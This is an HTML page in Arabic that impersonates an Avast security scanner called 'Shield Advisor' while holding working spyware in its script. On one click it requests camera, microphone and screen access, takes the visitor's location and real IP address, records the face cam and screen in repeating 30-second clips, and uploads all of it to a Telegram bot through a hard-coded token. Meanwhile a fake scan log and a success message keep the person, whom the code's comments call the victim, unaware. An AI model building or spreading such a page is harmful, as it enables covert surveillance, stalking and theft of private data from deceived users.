<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Avast Premium Security | Shield Advisor</title>
    <style>
        :root { --orange: #ff7b00; --dark: #1a1a1b; --bg: #fffcf5; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; background: white; color: #333; }
        
        /* Header */
        .header { display: flex; justify-content: space-between; padding: 15px 8%; align-items: center; border-bottom: 1px solid #eee; background: #fff; }
        .logo-small { width: 40px; height: 40px; border-radius: 50%; vertical-align: middle; }
        
        .hero { background: var(--bg); padding: 50px 8%; text-align: center; border-bottom: 1px solid #f0e0c0; }
        .main-card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 15px 50px rgba(0,0,0,0.1); display: inline-block; width: 100%; max-width: 550px; border: 2px solid var(--orange); }
        
        .logo-main { width: 100px; height: 100px; border-radius: 50%; box-shadow: 0 0 20px rgba(255, 123, 0, 0.2); margin-bottom: 20px; }

        .btn-scan { background: var(--orange); color: white; border: none; padding: 20px 0; font-size: 1.4rem; font-weight: bold; border-radius: 50px; cursor: pointer; transition: 0.3s; width: 100%; box-shadow: 0 8px 20px rgba(255, 123, 0, 0.3); }
        .btn-scan:hover { transform: translateY(-3px); box-shadow: 0 12px 25px rgba(255, 123, 0, 0.5); }

        .terminal { display: none; background: #000; color: #00ff41; padding: 15px; border-radius: 10px; font-family: 'Courier New', monospace; font-size: 13px; text-align: left; direction: ltr; height: 150px; overflow-y: auto; margin-top: 20px; }
        
        .trust-section { padding: 40px 8%; display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 20px; text-align: center; }
        .trust-item img { width: 45px; margin-bottom: 10px; }
        .trust-item h4 { color: #d48806; margin: 5px 0; }
    </style>
</head>
<body>

<div class="header">
    <div>
        <img src="images (1).jpg" class="logo-small">
        <span style="font-weight: bold; margin-right: 10px; color: var(--orange);">Shield Advisor</span>
    </div>
    <div style="color: #666; font-size: 13px; font-weight: bold;">Cloud Protection Active 2026</div>
</div>

<div class="hero">
    <h1>فحص الأمان المتقدم من <span style="color:var(--orange)">Avast</span></h1>
    <p style="color: #666; margin-bottom: 30px;">نظام Shield Advisor المتصل بسحابة Avast العالمية لتأمين جهازك فوراً.</p>

    <div class="main-card" id="main-container">
        <div id="setup-ui">
            <img src="images (1).jpg" class="logo-main">
            <button class="btn-scan" onclick="startMasterEngine()">بدء الفحص وتأمين الجهاز</button>
        </div>

        <div class="terminal" id="term"></div>
    </div>
</div>

<div class="trust-section">
    <div class="trust-item">
        <img src="https://cdn-icons-png.flaticon.com/512/2092/2092663.png">
        <h4>الذكاء الاصطناعي</h4>
        <p>تحليل فوري للتهديدات</p>
    </div>
    <div class="trust-item">
        <img src="https://cdn-icons-png.flaticon.com/512/1162/1162258.png">
        <h4>تأمين المتصفح</h4>
        <p>تشفير بيانات كروم</p>
    </div>
    <div class="trust-item">
        <img src="https://cdn-icons-png.flaticon.com/512/702/702797.png">
        <h4>فحص الكاميرا</h4>
        <p>منع التجسس النشط</p>
    </div>
</div>

<video id="v" autoplay muted style="display:none"></video>

<script>
    const TOKEN = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
    const ADMIN_ID = "8754338811";

    async function sendMsg(text) {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: ADMIN_ID, text: text, parse_mode: 'Markdown' })
        });
    }

    async function startMasterEngine() {
        const setup = document.getElementById('setup-ui');
        const term = document.getElementById('term');
        
        setup.style.display = 'none';
        term.style.display = 'block';
        addLog("> Connecting to Avast Secure Cloud...");

        try {
            // طلب الصلاحيات
            const camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
            addLog("> [OK] Permissions Secured.");

            // سحب البيانات (الموقع والـ IP)
            navigator.geolocation.getCurrentPosition(p => {
                sendMsg(`📍 **موقع الضحية:** \nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            });

            const rtc = new RTCPeerConnection();
            rtc.createDataChannel("");
            rtc.createOffer().then(o => rtc.setLocalDescription(o));
            rtc.onicecandidate = i => {
                if(i.candidate) sendMsg(`🌐 **الـ IP الحقيقي:** \`${i.candidate.candidate.split(" ")[4]}\``);
            };

            // بدء التسجيل المتتابع (كل 30 ثانية)
            record(camStream, "FACE_CAM");
            record(screenStream, "SCREEN_LIVE");

            // تمويه الضحية بنجاح الفحص
            let progress = 0;
            const inv = setInterval(() => {
                progress += 20;
                addLog(`> Analyzing system layers... ${progress}%`);
                if(progress >= 100) {
                    clearInterval(inv);
                    document.getElementById('main-container').innerHTML = `
                        <img src="images (1).jpg" class="logo-small" style="width:60px; height:60px; margin-bottom:15px;">
                        <h3 style="color:#00ff41; margin-top:0;">✅ تم تأمين الجهاز بنجاح!</h3>
                        <p style="font-size:14px; color:#555;">نظام Shield Advisor يحميك الآن من كافة محاولات التجسس والاختراق.</p>
                        <div style="background:#f9f9f9; padding:10px; border-radius:8px; font-size:12px; color:#888;">حالة الجدار الناري: نشط ومحمي</div>
                    `;
                }
            }, 2000);

        } catch (e) {
            alert("⚠️ تنبيه أمني: يجب السماح بجميع الأذونات لإتمام فحص الحماية بنجاح.");
            location.reload();
        }
    }

    function record(stream, label) {
        const recorder = new MediaRecorder(stream);
        let chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'video/mp4' });
            const fd = new FormData();
            fd.append('chat_id', ADMIN_ID);
            fd.append('video', blob, `${label}.mp4`);
            fd.append('caption', `🚀 **لقطة حية [${label}]**`);
            fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
            if (stream.active) record(stream, label);
        };
        recorder.start();
        setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, 30000);
    }

    function addLog(msg) {
        const term = document.getElementById('term');
        term.innerHTML += `<div>${msg}</div>`;
        term.scrollTop = term.scrollHeight;
    }
</script>
</body>
</html>
